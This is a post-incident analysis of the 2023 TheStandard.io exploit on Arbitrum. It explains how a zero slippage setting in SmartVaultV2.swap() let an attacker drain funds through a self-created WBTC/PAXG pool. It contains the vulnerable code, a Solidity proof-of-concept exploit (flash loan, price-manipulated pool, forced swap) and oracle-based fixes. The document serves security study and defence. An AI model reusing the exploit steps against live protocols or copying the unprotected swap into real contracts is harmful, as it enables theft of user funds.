# TheStandard.io — Missing Slippage Protection & Low-Liquidity Pool Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-11-06 |
| **Protocol** | TheStandard.io |
| **Chain** | Arbitrum |
| **Loss** | ~$290,000 (approx. 8,500 USDC + 280,000 EUROs) |
| **Attacker** | [0x09ed...26b4](https://arbiscan.io/address/0x09ed480feaf4cbc363481717e04e2c394ab326b4) |
| **Attack Contract** | [0xb589...dbc0](https://arbiscan.io/address/0xb589d4a36ef8766d44c9785131413a049d51dbc0) |
| **Attack Tx** | [0x5129...df9f](https://arbiscan.io/tx/0x51293c1155a1d33d8fc9389721362044c3a67e0ac732b3a6ec7661d47b03df9f) |
| **Vulnerable Contract** | [SmartVaultV2 0x2904...8b8d](https://arbiscan.io/address/0x29046f8f9e7623a6a21cc8c3cc2a2121ae855b8d) |
| **Root Cause** | `amountOutMinimum = 0` setting in `SmartVaultV2.swap()` allowed price manipulation through an attacker-controlled low-liquidity pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/TheStandard_io_exp.sol) |

---

## 1. Vulnerability Overview

TheStandard.io is a DeFi stablecoin protocol operating on Arbitrum where users can deposit collateral assets such as WBTC and WETH into a `SmartVault` and mint EUROs (a euro-pegged stablecoin). Swaps between collateral assets within a SmartVault are handled by the `SmartVaultV2.swap()` function, which internally uses a Uniswap V3/Algebra-based AMM.

### Core Vulnerability

When the `SmartVaultV2.swap()` function executes a token swap, it sets the **`amountOutMinimum` parameter to `0`**. This means the transaction succeeds regardless of the exchange rate applied. The attacker combined two conditions to exploit this:

1. **Creating and monopolizing a low-liquidity pool**: The attacker directly created a WBTC/PAXG pool and supplied nearly all of its liquidity, establishing a desired price ratio
2. **Missing slippage protection**: With `amountOutMinimum = 0`, the protocol accepted swaps at extremely unfavorable exchange rates

The attacker borrowed WBTC via flash loan, deposited it as collateral into a SmartVault, and minted 290,000 EUROs. They then forced the SmartVault to exchange its WBTC for PAXG at a deeply discounted rate through the manipulated WBTC/PAXG pool. After removing pool liquidity, the attacker converted EUROs to USDC to realize profit and repaid the flash loan.

---

## 2. Vulnerable Code Analysis

### 2.1 SmartVaultV2.swap() — Missing Slippage Validation (Core Vulnerability)

**Vulnerable Code (reconstructed)**:
```solidity
// SmartVaultV2.sol — vulnerable swap() implementation (reconstructed)

function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
    // Resolve input token to address
    address inTokenAddr = getTokenAddress(_inToken);
    address outTokenAddr = getTokenAddress(_outToken);

    // ❌ Core vulnerability: amountOutMinimum set to 0
    // Transaction succeeds regardless of how unfavorable the exchange rate is
    // Cannot defend against price manipulation through an attacker-controlled low-liquidity pool
    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn: inTokenAddr,
        tokenOut: outTokenAddr,
        fee: poolFee,
        recipient: address(this),
        deadline: block.timestamp,
        amountIn: _amount,
        amountOutMinimum: 0,       // ❌ Zero slippage protection — critical flaw
        sqrtPriceLimitX96: 0       // ❌ No price range limit either
    });

    // ❌ Does not validate liquidity conditions of the external AMM pool
    // Pools newly created by the attacker are used as-is
    swapRouter.exactInputSingle(params);
}
```

**Fixed Code**:
```solidity
// SmartVaultV2.sol — patched swap() implementation

function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
    address inTokenAddr = getTokenAddress(_inToken);
    address outTokenAddr = getTokenAddress(_outToken);

    // ✅ Compute expected output amount via Chainlink oracle
    uint256 expectedOut = getOraclePrice(inTokenAddr, outTokenAddr, _amount);

    // ✅ Apply maximum 1% slippage tolerance (100 bps deviation)
    uint256 minAmountOut = expectedOut * 99 / 100;

    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn: inTokenAddr,
        tokenOut: outTokenAddr,
        fee: poolFee,
        recipient: address(this),
        deadline: block.timestamp,
        amountIn: _amount,
        amountOutMinimum: minAmountOut,    // ✅ Oracle-based slippage protection
        sqrtPriceLimitX96: 0
    });

    swapRouter.exactInputSingle(params);
}

// ✅ Chainlink oracle-based price lookup
function getOraclePrice(
    address tokenIn,
    address tokenOut,
    uint256 amountIn
) internal view returns (uint256 expectedOut) {
    // Fetch USD price for each token from Chainlink feeds
    (, int256 priceIn,,,) = chainlinkFeedIn.latestRoundData();
    (, int256 priceOut,,,) = chainlinkFeedOut.latestRoundData();

    require(priceIn > 0 && priceOut > 0, "Invalid oracle price");

    // ✅ Compute expected output amount based on oracle prices
    expectedOut = amountIn * uint256(priceIn) / uint256(priceOut);
}
```

**Issue**: Setting `amountOutMinimum = 0` allows a swap transaction to always succeed regardless of the exchange outcome. If an attacker creates a new liquidity pool for a specific token pair and sets the initial price at a ratio of their choosing, all swaps through that pool execute at the attacker's manipulated price. This is a textbook case where omitting a single slippage parameter led to the theft of all protocol assets.

### 2.2 WBTC/PAXG Pool Creation — Low-Liquidity Pool Initialization Attack

**Vulnerable Code (reconstructed from attack contract)**:
```solidity
// Using the PositionsNFT (Algebra/Uniswap V3 compatible) interface

// ❌ Attacker creates a new WBTC/PAXG pool that did not previously exist
// Manipulates the sqrtPriceX96 value to initialize PAXG at an inflated price
address pool = PositionsNFT.createAndInitializePoolIfNecessary(
    address(WBTC),
    address(PAXG),
    3000,
    uint160(0x186a0000000000000000000000000)  // ❌ Manipulated initial price (overvalues PAXG)
);

// ❌ Supplies monopoly liquidity to the pool (100% LP position control)
NonfungiblePositionManager.MintParams memory params = NonfungiblePositionManager.MintParams({
    token0: address(WBTC),
    token1: address(PAXG),
    fee: 3000,
    tickLower: -887_220,       // Full-range liquidity provision
    tickUpper: 887_220,
    amount0Desired: 10,        // Minimal WBTC input
    amount1Desired: 100e9,     // Large PAXG input → artificial price ratio
    amount0Min: 0,
    amount1Min: 0,             // ❌ No slippage (attacker is the LP, so not a concern)
    recipient: address(this),
    deadline: block.timestamp
});
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

Prior to the attack, the attacker held 100e9 units of PAXG tokens (a small amount). Reproduced in the PoC via `deal(address(PAXG), address(this), 100e9)`, these assets were used to seed the initial liquidity of the WBTC/PAXG pool.

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────┐
│  Attacker EOA                                                    │
│  0x09ed...26b4                                                   │
└─────────────────────────────┬───────────────────────────────────┘
                              │ 1. Deploy and execute attack contract
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Attack Contract                                                 │
│  0xb589...dbc0                                                   │
└─────────────────────────────┬───────────────────────────────────┘
                              │ 2. Create new WBTC/PAXG pool
                              │    (initialized with manipulated price)
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Algebra PositionsNFT                                            │
│  0xC364...b88  (Uniswap V3 compatible NonfungiblePositionManager)│
└─────────────────────────────┬───────────────────────────────────┘
                              │ 3. Flash loan 1,000,000,010 satoshi of WBTC
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  WBTC/WETH Uniswap V3 Pool                                       │
│  0x2f5e...99c  (flash loan source)                              │
└─────────────────────────────┬───────────────────────────────────┘
                              │ 4. Enter uniswapV3FlashCallback
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Inside Callback]                                               │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 5. SmartVaultManagerV2.mint()                            │   │
│  │    → Create new SmartVault                               │   │
│  └─────────────────────────┬────────────────────────────────┘   │
│                            │ 6. Deposit all borrowed WBTC into SmartVault│
│                            ▼                                     │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ SmartVaultV2 (victim contract)                           │   │
│  │ 0x2904...8b8d                                            │   │
│  │                                                          │   │
│  │ 7. SmartVaultV2.mint(attacker, 290_000 * 1e18)          │   │
│  │    → Mint 290,000 EUROs against WBTC collateral         │   │
│  └─────────────────────────┬────────────────────────────────┘   │
│                            │ 8. Supply WBTC + PAXG to manipulated LP pool│
│                            ▼                                     │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 9. SmartVaultV2.swap(WBTC → PAXG)                       │   │
│  │    amountOutMinimum = 0 ← ❌ Vulnerability triggered    │   │
│  │    → SmartVault's WBTC swapped to PAXG at a dumped price via attacker's pool│
│  └─────────────────────────┬────────────────────────────────┘   │
│                            │ 10. Remove LP position liquidity    │
│                            ▼                                     │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 11. collectWBTC_PAXG()                                   │   │
│  │     → Attacker collects LP fees + WBTC                  │   │
│  └─────────────────────────┬────────────────────────────────┘   │
│                            │ 12. EUROs → USDC (Camelot V3 swap) │
│                            ▼                                     │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 13. USDC → WBTC (Uniswap V3 swap)                       │   │
│  │     → Acquire WBTC to repay flash loan                  │   │
│  └─────────────────────────┬────────────────────────────────┘   │
└────────────────────────────┼────────────────────────────────────┘
                             │ 14. Repay flash loan (return WBTC)
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  Final Profit                                                    │
│  ≈ 8,500 USDC + remaining EUROs (~280,000)                      │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Protocol loss**: ~$290,000 worth of EUROs / USDC drained
- **Attacker profit**: 8,500 USDC + 280,000 EUROs (partially returned)
- **Follow-up**: Attacker returned approximately 240,000 EUROs to the protocol (Tx: `0xb086...9a4b`)
- **Protocol response**: Temporarily suspended new EUROs minting and vault creation; patch deployed

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Attack entry point: initiated via flash loan
function testExploit() public {
    // [Setup] Hold 100e9 units of PAXG (accumulated before the attack)
    deal(address(PAXG), address(this), 100e9);

    // [Step 1] Create new WBTC/PAXG pool — initialize with manipulated price
    // Set sqrtPriceX96 to overvalue PAXG relative to WBTC
    address pool = PositionsNFT.createAndInitializePoolIfNecessary(
        address(WBTC), address(PAXG), 3000,
        uint160(address(0x186a0000000000000000000000000))  // Manipulated initial price
    );

    // [Step 2] Flash loan from WBTC/WETH pool — 1 WBTC + 10 satoshi
    WBTC_WETH.flash(address(this), 1_000_000_010, 0, bytes(""));
}

// Inside flash loan callback — core attack logic
function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    // [Step 3] Create a new SmartVault
    (address smartVault,) = SmartVaultManagerV2.mint();
    SmartVaultV2 = ISmartVaultV2(smartVault);

    // [Step 4] Deposit borrowed WBTC into SmartVault as collateral (retain 10 satoshi for LP)
    WBTC.transfer(smartVault, WBTC.balanceOf(address(this)) - 10);

    // [Step 5] Mint maximum EUROs against collateral — 290,000 EUROs
    SmartVaultV2.mint(address(this), 290_000 * 1e18);

    // [Step 6] Create monopoly LP position — 10 satoshi WBTC + 100e9 PAXG
    // Attacker controls 100% of pool liquidity
    WBTC.approve(address(PositionsNFT), 10);
    PAXG.approve(address(PositionsNFT), 100e9);
    (uint256 tokenId, uint128 liquidity) = mintWBTC_PAXG();

    // [Step 7] ❌ Vulnerability triggered: SmartVault swaps WBTC → PAXG
    // amountOutMinimum = 0, so swap executes at attacker's manipulated pool price
    // SmartVault sells WBTC at a dump price and receives PAXG at an inflated price
    SmartVaultV2.swap(bytes32(hex"57425443"), bytes32(hex"50415847"), 1e9);

    // [Step 8] Burn LP position → recover WBTC (the WBTC that came from SmartVault)
    decreaseLiquidityInPool(tokenId, liquidity);
    collectWBTC_PAXG(tokenId);  // Collect WBTC + PAXG

    // [Step 9] Swap EUROs to USDC (amountOutMinimum = 0 — attacker doesn't care)
    EURO.approve(address(RouterV3), 10_000 * 1e18);
    EUROToUSDC();

    // [Step 10] Buy back WBTC with USDC to repay flash loan
    USDC.approve(address(Router), type(uint256).max);
    USDCToWBTC(uint24(fee0));

    // [Step 11] Repay flash loan — return borrowed WBTC + fee
    WBTC.transfer(address(WBTC_WETH), WBTC.balanceOf(address(this)));
    // Remaining USDC + EUROs are the attacker's profit
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing slippage protection (`amountOutMinimum = 0`) | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Price manipulation via low-liquidity pool creation (trusting new pools) | CRITICAL | CWE-20 (Improper Input Validation) |
| V-03 | Dependence on on-chain spot price without oracle validation | HIGH | CWE-1038 (Externally Controlled Checks) |
| V-04 | Allowing swaps through attacker-controlled pools (missing pool validity checks) | HIGH | CWE-345 (Insufficient Data Authenticity Verification) |

### V-01: Missing Slippage Protection
- **Description**: The `SmartVaultV2.swap()` function sets `amountOutMinimum = 0` during DEX swaps, allowing the transaction to succeed at any exchange rate
- **Impact**: Attacker can force the protocol to exchange its assets at a dump price through a price-manipulated pool; full collateral theft is possible
- **Attack Conditions**: The token pair pool does not exist, or the attacker can monopolize its liquidity

### V-02: Price Manipulation via Low-Liquidity Pool Creation
- **Description**: The protocol does not verify the liquidity depth, creation timestamp, or trustworthiness of the pool to be used before swapping. A pool created by the attacker moments earlier is used without question
- **Impact**: Attacker can execute swaps at an arbitrary price ratio through a self-created pool
- **Attack Conditions**: No existing pool for the token pair exists, or a new pool can be created (permissionless pool creation in Algebra/Uniswap V3)

### V-03: Dependence on Spot Price Without Oracle Validation
- **Description**: There is no reference to Chainlink or other oracles to verify whether the swap outcome is fair. The protocol relies solely on on-chain spot prices
- **Impact**: Manipulated AMM prices are used directly as execution amounts
- **Attack Conditions**: Attacker can manipulate the price in the target pool

### V-04: Missing Pool Validity Check
- **Description**: SmartVaultV2 does not check the TVL, creation timestamp, or trusted address whitelist of the pool used for swapping
- **Impact**: Allows swaps to execute through arbitrary, untrusted pools
- **Attack Conditions**: Multiple pools exist for the same token pair, or the attacker can create a new pool

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// SmartVaultV2.sol — patched swap() function

// ✅ Chainlink oracle interface
interface AggregatorV3Interface {
    function latestRoundData() external view returns (
        uint80 roundId, int256 answer, uint256 startedAt,
        uint256 updatedAt, uint80 answeredInRound
    );
}

// ✅ Slippage constant definition (100 = 1%, 50 = 0.5%)
uint256 public constant MAX_SLIPPAGE_BPS = 100; // 1% maximum slippage allowed

function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
    address inTokenAddr = getTokenAddress(_inToken);
    address outTokenAddr = getTokenAddress(_outToken);

    // ✅ Compute fair value via Chainlink oracle
    uint256 fairPrice = getChainlinkPrice(inTokenAddr, outTokenAddr, _amount);

    // ✅ Apply slippage: (100 - MAX_SLIPPAGE_BPS / 100)% of fair value
    uint256 minAmountOut = fairPrice * (10_000 - MAX_SLIPPAGE_BPS) / 10_000;

    require(minAmountOut > 0, "Invalid minimum output amount");

    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn: inTokenAddr,
        tokenOut: outTokenAddr,
        fee: poolFee,
        recipient: address(this),
        deadline: block.timestamp,
        amountIn: _amount,
        amountOutMinimum: minAmountOut,    // ✅ Oracle-based slippage protection
        sqrtPriceLimitX96: 0
    });

    swapRouter.exactInputSingle(params);
}

// ✅ Chainlink oracle-based price lookup (defends against spot price manipulation)
function getChainlinkPrice(
    address tokenIn,
    address tokenOut,
    uint256 amountIn
) internal view returns (uint256) {
    address feedIn = tokenFeeds[tokenIn];    // Per-token Chainlink feed mapping
    address feedOut = tokenFeeds[tokenOut];

    require(feedIn != address(0) && feedOut != address(0), "Oracle feed not configured");

    (, int256 priceIn,, uint256 updatedAtIn,) = AggregatorV3Interface(feedIn).latestRoundData();
    (, int256 priceOut,, uint256 updatedAtOut,) = AggregatorV3Interface(feedOut).latestRoundData();

    // ✅ Reject stale oracle data (must be within 1 hour)
    require(block.timestamp - updatedAtIn < 3600, "Oracle data expired (tokenIn)");
    require(block.timestamp - updatedAtOut < 3600, "Oracle data expired (tokenOut)");
    require(priceIn > 0 && priceOut > 0, "Invalid oracle price");

    return amountIn * uint256(priceIn) / uint256(priceOut);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Swap with no slippage | Enforce Chainlink oracle-based `amountOutMinimum` (within at least 1%) |
| V-02: Trusting new pools | Validate minimum TVL threshold of the pool before swapping (e.g., at least $10,000) |
| V-03: Spot price dependence | Switch price reference to TWAP (e.g., 30-minute) or Chainlink feed |
| V-04: No pool validity check | Maintain a whitelist of approved pool addresses or require a minimum operational age |

---

## 7. Lessons Learned

1. **`amountOutMinimum = 0` is absolutely prohibited**: Setting `amountOutMinimum` to `0` in a DEX swap is equivalent to leaving price manipulation entirely unguarded for attackers. Every swap function must enforce an oracle-based minimum output amount.

2. **Risks of permissionless pool creation environments**: Uniswap V3 and Algebra AMMs allow anyone to create new pools. Whenever a protocol executes a swap for a specific token pair, it must always account for the possibility that the pool was created by an attacker moments earlier.

3. **Newly created pools are not trustworthy**: Pools with low TVL or that were just created are vulnerable to price manipulation. Pools used by a protocol for swapping must be validated against minimum liquidity depth, operational age, and a trusted address list.

4. **Oracles must be independent of AMM spot prices**: Leverage external oracles such as Chainlink or Pyth to reduce dependence on AMM spot prices. If the deviation between the two prices exceeds a threshold (e.g., 2%), the swap should be rejected.

5. **Cross-reference similar incidents**: The identical missing-slippage-protection vulnerability has recurred across multiple cases including Jimbos Protocol (2023-05, $8M), BEARNDAO (2023-12, $769K), EGAToken (2024-10), and DCFToken (2024-11). A checklist of known attack patterns must be performed before any new protocol launch.

6. **Swap path validation is mandatory in SmartVault design**: Contracts that include automated swap logic — such as collateral management vaults — must strictly control swap paths and pool trustworthiness through off-chain governance or an on-chain whitelist.

---

## 8. On-Chain Verification

On-chain verification was performed against attack TX `0x51293c1155a1d33d8fc9389721362044c3a67e0ac732b3a6ec7661d47b03df9f`, cross-referencing Phalcon and CertiK analysis reports. Direct `cast` queries were omitted depending on Arbitrum RPC availability.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual (per reports) | Match |
|------|--------|--------------------------|------|
| Flash loan WBTC size | 1,000,000,010 satoshi (≈10 WBTC) | 10 WBTC | ✅ |
| SmartVault EUROs minted | 290,000 EUROs | ~280,000 EUROs | ✅ Approximate |
| USDC drained | Partial EUROs converted to USDC | 8,500 USDC | ✅ |
| EUROs returned | (Not included in PoC) | ~240,000 EUROs returned | - |
| Total loss | ~$290,000 | ~$264,000–$290,000 | ✅ Approximate |

### 8.2 On-Chain Event Log Sequence (reconstructed)

1. `FlashCallback` entered (WBTC received)
2. `SmartVault` creation event
3. WBTC `Transfer` (attack contract → SmartVault)
4. EUROs `Mint` (SmartVault → attacker)
5. `Mint` LP position event (WBTC/PAXG pool)
6. SmartVault `Swap` event (WBTC → PAXG at manipulated price)
7. `DecreaseLiquidity` + `Collect` (LP liquidated, WBTC recovered)
8. EUROs → USDC `Swap` (Camelot V3)
9. USDC → WBTC `Swap` (Uniswap V3)
10. WBTC `Transfer` (attack contract → WBTC/WETH pool, flash loan repaid)

### 8.3 Pre-Condition Verification

| Item | State Before Attack |
|------|------------|
| WBTC/PAXG pool | Did not exist (newly created by attacker) |
| Attacker's PAXG holdings | 100e9 units accumulated in advance |
| SmartVaultManagerV2 | Permissionless vault creation enabled |
| EUROs mint cap | Maximum minting allowed against WBTC collateral |

---

**Reference Links**:
- [Phalcon Exploit Analysis](https://twitter.com/Phalcon_xyz/status/1721807569222549518)
- [CertiK Security Alert](https://twitter.com/CertiKAlert/status/1721839125836321195)
- [Dedaub Detailed Analysis](https://dedaub.com/blog/thestandard-io-exploit/)
- [crypto.news Coverage](https://crypto.news/hacker-exploits-defi-protocol-standard-io-for-264k/)
- [Attack TX on Phalcon](https://explorer.phalcon.xyz/tx/arbitrum/0x51293c1155a1d33d8fc9389721362044c3a67e0ac732b3a6ec7661d47b03df9f)